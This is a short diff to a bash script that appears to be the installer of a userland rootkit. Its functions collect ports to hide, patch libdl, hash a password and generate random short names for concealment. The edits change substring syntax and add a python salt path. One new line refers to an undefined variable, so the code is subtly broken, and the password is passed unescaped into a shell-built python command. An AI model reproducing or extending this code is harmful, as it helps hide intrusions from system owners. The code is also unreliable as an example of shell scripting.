@@ -54,7 +54,7 @@ get_hide_ports(){
     for i in ${!range_hide_ports[@]}; do
         local tmp+="${range_hide_ports[i]}-"
         if (( $i % 2 )); then
-            HIDE_PORTS+=("${tmp::-1}")
+            HIDE_PORTS+=("${tmp::${#tmp}-1}")
             unset tmp
         fi
     done
@@ -66,8 +66,10 @@ get_hide_ports(){
 }
 
 crypt_password(){ # if we can use python3, use it. if not, use openssl.
+    salt=`random 'A-Za-z0-9' 16`;
+    [ -f `bin_path python` ] && { salt=$salt; echo -n `python -c "import crypt; print(crypt.crypt(\"$1\", \"\\$6\\$$salt\"))"`; return; }
     [ -f `bin_path python3` ] && { echo -n `python3 -c "import crypt; print(crypt.crypt(\"$1\"))"`; return; }
-    echo -n "`openssl passwd -6 -salt `random 'A-Za-z0-9' 16` $1`"
+    echo -n "`openssl passwd -6 -salt $salt $1`"
 }
 
 patch_libdl(){
@@ -81,7 +83,7 @@ get_rand_name(){
     name_length=6
 
     name=${names[$RANDOM % ${#names[@]}]}
-    while [ ${#name} -gt $name_length ]; do name=${name::-1}; done
+    while [ ${#name} -gt $name_length ]; do name=${name::${#a}-1}; done
     while [ ${#name} -lt $name_length ]; do name+="`random 'a-z' 1`"; done
 
     echo -n "$name"
